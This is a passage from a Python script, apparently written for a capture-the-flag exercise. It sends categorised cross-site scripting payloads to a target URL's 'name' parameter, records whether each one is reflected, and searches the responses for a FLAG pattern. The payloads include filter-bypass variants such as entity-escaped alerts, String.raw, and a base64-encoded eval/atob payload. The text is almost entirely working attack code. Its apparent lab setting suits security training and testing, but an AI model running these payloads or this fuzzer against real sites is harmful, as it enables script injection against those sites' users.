        "<img src=x onerror=alert(&#39;XSS&#39;)>",
        "<svg/onload=alert(String.raw`XSS`)>"
    ],
    "BASE64_DECODE": [
        "<img src=x onerror=eval(atob('YWxlcnQoIlhTUyIp')))>"
    ]
}

# Results tracking
results = {}

print("=" * 80)
print("XSS PAYLOAD TESTING - Systematic Bypass Analysis")
print("=" * 80)
print(f"Target: {target_url}?name=[PAYLOAD]\n")

# Test each payload
for category, category_payloads in payloads.items():
    print(f"\n[+] TESTING CATEGORY: {category}")
    print("-" * 80)
    
    for payload in category_payloads:
        # URL encode the payload for safe transmission
        encoded_payload = urllib.parse.quote(payload, safe='')
        full_url = f"{target_url}?name={encoded_payload}"
        
        print(f"\n[*] Payload: {payload}")
        print(f"[*] Encoded: {encoded_payload}")
        
        try:
            # Send GET request
            response = requests.get(full_url, timeout=10)
            
            # Check if payload was reflected
            if payload in response.text:
                reflection_status = "REFLECTED"
            else:
                reflection_status = "NOT REFLECTED"
            
            # Check for FLAG pattern
            flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
            flag_status = flag_match.group(0) if flag_match else "No flag found"
            
            # Store results
            results[payload] = {
                "category": category,
                "status_code": response.status_code,
                "reflection": reflection_status,
                "flag": flag_status,
                "response_length": len(response.text),
                "content_snippet": response.text[:300] if len(response.text) > 300 else response.text
            }
            
            print(f"[*] Status: {response.status_code}")
            print(f"[*] Reflection: {reflection_status}")
            print(f"[*] Flag: {flag_status}")
            print(f"[*] Response Length: {len(response.text)}B")
            print(f"[*] Content Snippet:\n{response.text[:300]}")
            
        except Exception as e:
            print(f"[!] ERROR: {str(e)}")
            results[payload] = {
                "category": category,
                "status_code": "ERROR",
                "reflection": "ERROR",
                "flag": "ERROR",
                "response_length": 0,
                "content_snippet": str(e)
            }

# Summary
print("\n" + "=" * 80)
print("SUMMARY OF RESULTS")
print("=" * 80)

working_payloads = []
for payload, data in results.items():
    if data["reflection"] == "REFLECTED":
        working_payloads.append(payload)
        print(f"\n[+] WORKING: {payload}")
        print(f"    Category: {data['category']}")
        print(f"    Status: {data['status_code']}")
        print(f"    Flag: {data['flag']}")

if not working_payloads:
    print("\n[!] No payloads were reflected in responses")

# Check for any flags found
all_flags = []
for payload, data in results.items():
    if data["flag"] != "No flag found" and data["flag"] != "ERROR":
        all_flags.append(data["flag"])

if all_flags:
    print(f"\n[!] FLAGS FOUND: {all_flags}")
else:
    print("\n[!] No FLAG patterns found in any response")

print("\n" + "=" * 80)

